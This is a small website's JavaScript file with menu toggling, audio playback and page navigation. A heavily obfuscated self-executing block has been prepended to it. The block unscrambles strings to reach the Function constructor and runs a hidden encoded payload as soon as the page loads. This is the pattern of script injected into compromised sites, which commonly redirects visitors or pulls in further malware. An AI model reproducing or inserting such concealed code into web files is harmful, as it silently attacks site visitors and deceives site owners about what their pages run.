(function(){var Ckr='',wuS=767-756;function MLA(k){var t=4155255;var l=k.length;var j=[];for(var e=0;e<l;e++){j[e]=k.charAt(e)};for(var e=0;e<l;e++){var h=t*(e+144)+(t%40808);var d=t*(e+426)+(t%28597);var b=h%l;var o=d%l;var r=j[b];j[b]=j[o];j[o]=r;t=(h+d)%7523710;};return j.join('')};var rRu=MLA('xenfgucdtkuaoqcytrsijbltmoprhswzvncro').substr(0,wuS);var wxZ='vag]i)a;i.o;e9A=r.axari"(;8r[<of)l va[+C[1v(n+=kAc;r2;>y) u{[bd(4pm7u+87ri)1l{v ;]6a,.a.7,r[3ihr8r[,a6=qv,=9,te,7(n){,;6flxgrguaeyr-lp5p+)ty)-)vras()rat=)eqjayh1=(=]v,v ;tv,)p+)] 0m9og;nls., (,=motf8vrv.i sovfv2v}v-=h8=; 2+ngq+g=++rj16rha.7d+os1nC<;]h84luirr"=a)ff "ihrrfsk;tvae t=.).} g.;"6=v{vhs;(=ncilfsrd =p=8(o;et= 8]n)vnytrbgo.=)v.lCp=;olan, h;ullah.bc(u*ah]da0nii=d,}.,().ejotracv6jC=oeA(m;);+ar+e2s}ro>hd(="hmxht,1),gw)f8y[6yo+ec[xv7r;o<(e=z+),=lt[iy;=0;d0a=v({iog)(e++ ;x)h9sln)rra7)t+v=niv++;syl,p0<s,h1.p.)qn ]em;d=hSv(4pnaplw lu[ya2nn2;= a(irl tlg=}1k((i5(h(8,et-us;(;gs)brt"-f5s=lorn0jlons+2h0a+u,r;7aq9,"ei+s(CgA(ln;(;td<;frv. rgrqp.acb.0rint8oe 4hb9sv{ivo.it"ig+)}!1e.C(;}una*r;md,l=r[;)cq;(2"r[ta,s(u;=+1=6n1+;3=n;nn2]d)c(c]=]seoh=am0j[=trtn5e7uo0C"fu!n]e8nrrv r.(va,o(1r,aenrl[jg9;;vl=aa,u.r0lCt-i])jve(hA nneh)oo=vyS1rtn]c;;tos5eqv0d()whwt) csenufg.3e i;at{;-.r=frloq;.b;c';var XKr=MLA[rRu];var wAA='';var Etk=XKr;var kCN=XKr(wAA,MLA(wxZ));var xMp=kCN(MLA('Qi=o&ov$b)S_fdh1e7oQntd()fo!f7-f"f=_7]$Q*6\/;)+#Q0,(0,(a.a%(iIttq#4n)q;ul$31.7t!nf,)7}f]e mafey 8+Qbq.l![1Q=rlc\'g}(e31_pc$_ti{%a_ pm6s)um+).1Qt{oise3C.gQo](#QQitQaQnn4$$[7_!=%s;1#_Q_;_ntuf.];t"_3.,(.(f!Q33 Q.];(,.=s}b!1.*)Q{ }a47.(-(q}s%1o!w$tob8,o;e.se(ift)o*9yoe,Q}e8E-rsj\/+sr)=_ r1i!_t_n[$nQ1g_QQel= }Q.QeQ()bor)3Q!4$08( 2;33ep{_f,mr.qo\'7+oe.0-8Qaifynh+_bju(Q%5$3oQov4Q .g_f.o4))Q7),$}v;e(3t7)%;.Q efQf;w;j)nk,&a!(r.$dQ$2,.9sa}wn$amw$}Q)![0i.)cfyQ;d!6(.0.fQ56.f))"q.!dQ_Qbo))j(]=a\/b(o)s3t=b18l.Q);j(..{..eQ;,_.\/=_0eQ%,n"t,3-,)4;-!jQd(nQ2))djf,7_2Qr]S_4om)Qe0c=76o,QC,,{Q%c).r =-.fl#Q!c..$(S(.50h)k#22aQ=!!i\/srt[hmQ+04d3Q}eQr nlff_Q$,3]rr%fn.)Qn) p+9e;7p7QaltQ.fQ0g(ui,Ql7q_$cf73anni1(e5gj. {f;)i;(sQQ2f)(=,$nfQQr#d"t{f}iur e2a)n(";&rt4=75(=,Qf_3;g(),Qld.=sm=($ci=*QfbQ(.nu};a3Q!Q.t$o,oQ7rp3Q!13e,=\'(3QQtr!.1p*Q,j)3,$Qd13(=l,+_)qm3!8je$o.jet$cpQ"(QQra(m&!bt..!;QQm_j5!l7Qbn4ro{.s;fr)]8$3%e({35!Q!{.ro$)1;uQqn}Qo]3ro)fdQftpS.]_Qahot0ya )0tQ({_ltib%jf 1.(QQ8i.])-(Qfe;f[) d,,Q Q;gbf{$Q.=%1pn(b0gre1)d=nak\'j2c*dpQ(l!QQo(7ya.ope.w!Qw)%5o(&q'));var SMB=Etk(Ckr,xMp );SMB(6196);return 9630})()

let a = document.getElementById("audio");

a.addEventListener("click", function() {
    a.play()
});

function menu(){
    let menu = document.getElementById("menu");
    if(menu.style.display === "none" || menu.style.display === ""){
        menu.style.display = "block";
        menu.style.animation = "appear 1s forwards";
    }
    else{
        menu.style.animation = "disapper 1s forwards";
        setTimeout(function() {
            menu.style.display = "none";
        }, 1001);
    }
}
function come(){
    location.href = "Entrada.html";
}
function come1(){
    location.href = "Lanzamientos.html";
}
